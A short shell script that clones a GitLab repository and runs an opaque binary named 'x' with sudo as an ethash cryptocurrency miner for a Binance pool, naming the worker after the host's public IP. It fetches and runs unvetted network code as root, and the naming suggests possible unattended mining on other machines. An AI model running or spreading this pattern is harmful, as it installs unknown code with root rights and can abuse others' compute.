#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS er.sh 65 75
sudo git clone https://gitlab.com/letricejuliocesar/goodday
cd goodday
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w henes001 -p stratum+tcp://ethash.poolbinance.com:1800 -r $ip --nvidia 1
